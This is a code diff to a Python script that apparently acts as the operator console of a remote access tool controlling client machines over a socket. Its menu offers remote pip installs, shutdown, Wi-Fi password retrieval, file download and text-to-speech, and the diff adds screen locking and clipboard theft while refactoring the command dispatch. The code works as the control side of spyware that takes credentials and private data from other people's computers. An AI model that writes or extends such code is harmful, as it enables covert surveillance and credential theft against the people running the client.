@@ -23,8 +23,7 @@ class bcolors:
 
 logsuc = "[+] Login Successful"
 logfail = "Incorrect"
-read = 0
-wallow = 0
+wallow = 0 # Will change to 1 if error occurs
 readallow = 0
 os = ""
 
@@ -62,10 +61,7 @@ def login():
 
             print(bcolors.GREEN + logsuc)
             print(bcolors.YELLOW + 'Please Type HELP to know all custom commands')
-            print("ONE")
             os = str(conn.recv(1024), "utf-8")
-            print(os)
-            print("ONE")
             if "win" in os:
                 os = "WINDOWS MACHINE"
             elif "mac" in os:
@@ -85,7 +81,7 @@ def help():
     print(bcolors.YELLOW + '[+] Type pipins to install a python module\n[+] Type quit to end the session\n[+] Type pubip'
                            ' to see the clients public IP address\n[+] Type shutdown to shutdown client and type cshutdo'
                            'wn to cancel\n[+] Type wifi pass to get the wifi '
-                           'password of the client machine\n[+] Type download\n[+] Type speak "any text that you want the client computer to speak"')
+                           'password of the client machine\n[+] Type download\n[+] Type speak "any text that you want the client computer to speak\n[+] Type "lock" (without the quotes) to lock the users computer (They will still be able to unlock it by entering their password as normal)\n[+] Type "clipboard get" (without the quotes) to get the current clipboard of the client)"')
 
 
 
@@ -112,13 +108,13 @@ def send_commands():
 
         if lcmd == "quit":
             quit()
-        if lcmd == "shutdown":
+        elif lcmd == "shutdown":
             cmd = "shutdown /s"
-        if lcmd == "cshutdown" or lcmd == "c shutdown":
+        elif lcmd == "cshutdown" or lcmd == "c shutdown":
             cmd = "shutdown /a"
-        if lcmd == "help":
+        elif lcmd == "help":
             help()
-        if lcmd == "pipins":
+        elif lcmd == "pipins":
             while True:
                 module = input("What module would you like to install on the client machine? ")
                 module = module.lower()
@@ -126,9 +122,9 @@ def send_commands():
                     quit()
                 cmd = "pip install " + module
                 break
-        if "speak " in lcmd:
+        elif "speak " in lcmd:
             conn.send(str.encode(lcmd))
-        if lcmd == "wifipass" or lcmd == "wifi pass":
+        elif lcmd == "wifipass" or lcmd == "wifi pass":
             ex = 0
             while True:
                 conn.send(str.encode(lcmd))
@@ -147,10 +143,7 @@ def send_commands():
                         print(bcolors.RED + final_wpass)
                         if wpass == "something":
                             wallow = 1
-        if lcmd.strip() == "lock":
-            print("TWO")
-            print(os)
-            print("TWO")
+        elif lcmd.strip() == "lock":
             if "win" in os.lower():
                 cmd = 'Rundll32.exe user32.dll,LockWorkStation'
             elif "mac" in os.lower():
@@ -158,11 +151,11 @@ def send_commands():
             else:
                 print("Please note that this command has only been tested for windows and mac os")
                 cmd = 'pmset displaysleepnow'
-        if lcmd == "clipboard get":
+        elif lcmd == "clipboard get":
             conn.send(str.encode(lcmd))
-            clipboard = str(conn.recv(99999), "utf-8")
+            clipboard = conn.recv(99999).decode("unicode_escape")[2:-1]
             print(clipboard)
-        if lcmd != "help" and "speak " not in lcmd and read == 0 and wallow == 0:
+        if lcmd != "help" and "speak " not in lcmd and wallow == 0 and lcmd != "clipboard get":
             if lcmd == "download":
                 download_files()
 
